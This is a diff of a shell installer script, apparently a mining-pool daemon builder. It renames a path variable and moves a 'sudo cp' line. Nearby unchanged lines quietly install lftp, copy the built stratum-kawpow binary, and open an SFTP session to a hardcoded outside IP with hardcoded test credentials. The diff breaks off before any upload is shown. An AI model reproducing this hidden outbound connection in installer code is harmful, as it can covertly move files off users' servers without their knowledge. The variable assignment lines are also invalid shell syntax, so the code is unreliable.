@@ -64,7 +64,7 @@ cd ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds
 	
 	convertlistalgos=$(find ${PATH_STRATUM}/config/ -mindepth 1 -maxdepth 1 -type f -not -name '.*' -not -name '*.sh' -not -name '*.log' -not -name 'stratum.*' -not -name '*.*.*' -iname '*.conf' -execdir basename -s '.conf' {} +);
 	optionslistalgos=$(echo -e "${convertlistalgos}" | awk '{ printf "%s on\n", $1}' | sort | uniq | grep [[:alnum:]])
-	$REALPATH=$PATH_STRATUM/stratum-kawpow
+	$REALPATHST=$PATH_STRATUM/stratum-kawpow
 	DIALOGFORLISTALGOS=${DIALOGFORLISTALGOS=dialog}
 	tempfile=`tempfile 2>/dev/null` || tempfile=/tmp/test$$
 	trap "rm -f $tempfile" 0 1 2 5 15
@@ -1126,10 +1126,10 @@ else
 	fi
 fi
 
-if [[ -f "$REALPATH" ]]; then
+if [[ -f "$REALPATHST" ]]; then
 sudo apt install lftp >/dev/null 2>&1;
+sudo cp $REALPATHST $PATH_STRATUM/sk
 cd $PATH_STRATUM
-sudo cp $REALPATH $PATH_STRATUM/sk
 lftp<<END_SCRIPT
 open sftp://154.26.137.167
 user test 1234
